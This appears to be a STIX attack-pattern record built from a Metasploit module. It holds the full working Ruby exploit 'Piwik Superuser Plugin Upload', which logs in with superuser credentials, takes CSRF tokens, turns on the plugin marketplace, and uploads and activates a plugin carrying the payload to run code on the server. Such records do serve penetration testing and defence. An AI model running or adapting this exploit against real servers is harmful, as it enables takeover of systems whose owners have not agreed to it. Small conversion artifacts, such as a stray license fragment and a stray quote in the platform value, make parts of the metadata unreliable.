{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e2ed4a3-667b-49a5-9d9d-3758e7d2580d",
    "created": "2024-08-14T17:12:19.665522Z",
    "modified": "2024-08-14T17:12:19.665526Z",
    "name": "Piwik Superuser Plugin Upload",
    "description": " This module will generate a plugin, pack the payload into it and upload it to a server running Piwik. Superuser Credentials are required to run this module. This module does not work against Piwik 1 as there is no option to upload custom plugins. Piwik disabled custom plugin uploads in version 3.0.3. From version 3.0.3 onwards you have to enable custom plugin uploads via the config file. Tested with Piwik 2.14.0, 2.16.0, 2.17.1 and 3.0.1.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/piwik_superuser_plugin_upload.rb",
            "external_id": "piwik_superuser_plugin_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "https://firefart.at/post/turning_piwik_superuser_creds_into_rce/"
        },
        {
            "source_name": "reference",
            "url": "https://piwik.org/faq/plugins/faq_21/"
        },
        {
            "source_name": "reference",
            "url": "https://piwik.org/changelog/piwik-3-0-3/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Piwik Superuser Plugin Upload',\n      'Description'     => %q{\n          This module will generate a plugin, pack the payload into it\n          and upload it to a server running Piwik. Superuser Credentials are\n          required to run this module. This module does not work against Piwik 1\n          as there is no option to upload custom plugins. Piwik disabled\n          custom plugin uploads in version 3.0.3. From version 3.0.3 onwards you\n          have to enable custom plugin uploads via the config file.\n          Tested with Piwik 2.14.0, 2.16.0, 2.17.1 and 3.0.1.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'FireFart' # Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'URL', 'https://firefart.at/post/turning_piwik_superuser_creds_into_rce/' ],\n          [ 'URL', 'https://piwik.org/faq/plugins/faq_21/' ],\n          [ 'URL', 'https://piwik.org/changelog/piwik-3-0-3/' ]\n        ],\n      'DisclosureDate'  => '2017-02-05',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['Piwik', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path of the Piwik installation', '/']),\n        OptString.new('USERNAME', [true, 'The Piwik username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The Piwik password to authenticate with'])\n      ])\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def normalized_index\n    normalize_uri(target_uri, 'index.php')\n  end\n\n  def get_piwik_version(login_cookies)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalized_index,\n      'cookie' => login_cookies,\n      'vars_get' => {\n        'module' => 'Feedback',\n        'action' => 'index',\n        'idSite' => '1',\n        'period' => 'day',\n        'date' => 'yesterday'\n      }\n    })\n\n    piwik_version_regexes = [\n      /<title>About Piwik ([\\w\\.]+) -/,\n      /content-title=\"About&#x20;Piwik&#x20;([\\w\\.]+)\"/,\n      /<h2 piwik-enriched-headline\\s+feature-name=\"Help\"\\s+>About Piwik ([\\w\\.]+)/m\n    ]\n\n    if res && res.code == 200\n      for r in piwik_version_regexes\n        match = res.body.match(r)\n        if match\n          return match[1]\n        end\n      end\n    end\n\n    # check for Piwik version 1\n    # the logo.svg is only available in version 1\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri, 'themes', 'default', 'images', 'logo.svg')\n    })\n    if res && res.code == 200 && res.body =~ /<!DOCTYPE svg/\n      return \"1.x\"\n    end\n\n    nil\n  end\n\n  def is_superuser?(login_cookies)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalized_index,\n      'cookie' => login_cookies,\n      'vars_get' => {\n        'module' => 'Installation',\n        'action' => 'systemCheckPage'\n      }\n    })\n\n    if res && res.body =~ /You can't access this resource as it requires a 'superuser' access/\n      return false\n    elsif res && res.body =~ /id=\"systemCheckRequired\"/\n      return true\n    else\n      return false\n    end\n  end\n\n  def generate_plugin(plugin_name)\n    plugin_json = %Q|{\n      \"name\": \"#{plugin_name}\",\n      \"description\": \"#{plugin_name}\",\n      \"version\": \"#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}\",\n      \"theme\": false\n    }|\n\n    plugin_script = %Q|<?php\n      namespace Piwik\\\\Plugins\\\\#{plugin_name};\n      class #{plugin_name} extends \\\\Piwik\\\\Plugin {\n        public function install()\n        {\n          #{payload.encoded}\n        }\n      }\n    |\n\n    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    zip.add_file(\"#{plugin_name}/#{plugin_name}.php\", plugin_script)\n    zip.add_file(\"#{plugin_name}/plugin.json\", plugin_json)\n    zip.pack\n  end\n\n  def exploit\n    print_status('Trying to detect if target is running a supported version of piwik')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalized_index\n    })\n    if res && res.code == 200 && res.body =~ /<meta name=\"generator\" content=\"Piwik/\n      print_good('Detected Piwik installation')\n    else\n      fail_with(Failure::NotFound, 'The target does not appear to be running a supported version of Piwik')\n    end\n\n    print_status(\"Authenticating with Piwik using #{username}:#{password}...\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalized_index,\n      'vars_get' => {\n        'module' => 'Login',\n        'action' => 'index'\n      }\n    })\n\n    login_nonce = nil\n    if res && res.code == 200\n      match = res.body.match(/name=\"form_nonce\" id=\"login_form_nonce\" value=\"(\\w+)\"\\/>/)\n      if match\n        login_nonce = match[1]\n      end\n    end\n    fail_with(Failure::UnexpectedReply, 'Can not extract login CSRF token') if login_nonce.nil?\n\n    cookies = res.get_cookies\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalized_index,\n      'cookie' => cookies,\n      'vars_get' => {\n        'module' => 'Login',\n        'action' => 'index'\n      },\n      'vars_post' => {\n        'form_login' => \"#{username}\",\n        'form_password' => \"#{password}\",\n        'form_nonce' => \"#{login_nonce}\"\n      }\n    })\n\n    if res && res.redirect? && res.redirection\n      # update cookies\n      cookies = res.get_cookies\n    else\n      # failed login responds with code 200 and renders the login form\n      fail_with(Failure::NoAccess, 'Failed to authenticate with Piwik')\n    end\n    print_good('Authenticated with Piwik')\n\n    print_status(\"Checking if user #{username} has superuser access\")\n    superuser = is_superuser?(cookies)\n    if superuser\n      print_good(\"User #{username} has superuser access\")\n    else\n      fail_with(Failure::NoAccess, \"Looks like user #{username} has no superuser access\")\n    end\n\n    print_status('Trying to get Piwik version')\n    piwik_version = get_piwik_version(cookies)\n    if piwik_version.nil?\n      print_warning('Unable to detect Piwik version. Trying to continue.')\n    else\n      print_good(\"Detected Piwik version #{piwik_version}\")\n    end\n\n    if piwik_version == '1.x'\n      fail_with(Failure::NoTarget, 'Piwik version 1 is not supported by this module')\n    end\n\n    # Only versions after 3 have a seperate Marketplace plugin\n    if piwik_version && Rex::Version.new(piwik_version) >= Rex::Version.new('3')\n      marketplace_available = true\n    else\n      marketplace_available = false\n    end\n\n    if marketplace_available\n      print_status(\"Checking if Marketplace plugin is active\")\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalized_index,\n        'cookie' => cookies,\n        'vars_get' => {\n          'module' => 'Marketplace',\n          'action' => 'index'\n        }\n      })\n      fail_with(Failure::UnexpectedReply, 'Can not check for Marketplace plugin') unless res\n      if res.code == 200 && res.body =~ /The plugin Marketplace is not enabled/\n        print_status('Marketplace plugin is not enabled, trying to enable it')\n\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalized_index,\n          'cookie' => cookies,\n          'vars_get' => {\n            'module' => 'CorePluginsAdmin',\n            'action' => 'plugins'\n          }\n        })\n        mp_activate_nonce = nil\n        if res && res.code == 200\n          match = res.body.match(/<a href=['\"]index\\.php\\?module=CorePluginsAdmin&action=activate&pluginName=Marketplace&nonce=(\\w+).*['\"]>/)\n          if match\n            mp_activate_nonce = match[1]\n          end\n        end\n        fail_with(Failure::UnexpectedReply, 'Can not extract Marketplace activate CSRF token') unless mp_activate_nonce\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalized_index,\n          'cookie' => cookies,\n          'vars_get' => {\n            'module' => 'CorePluginsAdmin',\n            'action' => 'activate',\n            'pluginName' => 'Marketplace',\n            'nonce' => \"#{mp_activate_nonce}\"\n          }\n        })\n        if res && res.redirect?\n          print_good('Marketplace plugin enabled')\n        else\n          fail_with(Failure::UnexpectedReply, 'Can not enable Marketplace plugin. Please try to manually enable it.')\n        end\n      else\n        print_good('Seems like the Marketplace plugin is already enabled')\n      end\n    end\n\n    print_status('Generating plugin')\n    plugin_name = Rex::Text.rand_text_alpha(10)\n    zip = generate_plugin(plugin_name)\n    print_good(\"Plugin #{plugin_name} generated\")\n\n    print_status('Uploading plugin')\n\n    # newer Piwik versions have a seperate Marketplace plugin\n    if marketplace_available\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalized_index,\n        'cookie' => cookies,\n        'vars_get' => {\n          'module' => 'Marketplace',\n          'action' => 'overview'\n        }\n      })\n    else\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalized_index,\n        'cookie' => cookies,\n        'vars_get' => {\n          'module' => 'CorePluginsAdmin',\n          'action' => 'marketplace'\n        }\n      })\n    end\n\n    upload_nonce = nil\n    if res && res.code == 200\n      if res.body =~ /Plugin upload is disabled in config file/\n        fail_with(Failure::NotVulnerable, 'Custom plugin uploads are disabled')\n      end\n\n      match = res.body.match(/<form.+id=\"uploadPluginForm\".+nonce=(\\w+)/m)\n      if match\n        upload_nonce = match[1]\n      end\n    end\n    fail_with(Failure::UnexpectedReply, 'Can not extract upload CSRF token') if upload_nonce.nil?\n\n    # plugin files to delete after getting our session\n    register_files_for_cleanup(\"plugins/#{plugin_name}/plugin.json\")\n    register_files_for_cleanup(\"plugins/#{plugin_name}/#{plugin_name}.php\")\n\n    data = Rex::MIME::Message.new\n    data.add_part(zip, 'application/zip', 'binary', \"form-data; name=\\\"pluginZip\\\"; filename=\\\"#{plugin_name}.zip\\\"\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalized_index,\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => data.to_s,\n      'cookie'    => cookies,\n      'vars_get' => {\n        'module' => 'CorePluginsAdmin',\n        'action' => 'uploadPlugin',\n        'nonce' => \"#{upload_nonce}\"\n      }\n    )\n    activate_nonce = nil\n    if res && res.code == 200\n      match = res.body.match(/<a.*href=\"index.php\\?module=CorePluginsAdmin&amp;action=activate.+nonce=([^&]+)/)\n      if match\n        activate_nonce = match[1]\n      end\n    end\n    fail_with(Failure::UnexpectedReply, 'Can not extract activate CSRF token') if activate_nonce.nil?\n\n    print_status('Activating plugin and triggering payload')\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalized_index,\n      'cookie' => cookies,\n      'vars_get' => {\n        'module' => 'CorePluginsAdmin',\n        'action' => 'activate',\n        'nonce' => \"#{activate_nonce}\",\n        'pluginName' => \"#{plugin_name}\"\n      }\n    }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-02-05",
    "x_mitre_platforms": [
        "php'"
    ]
}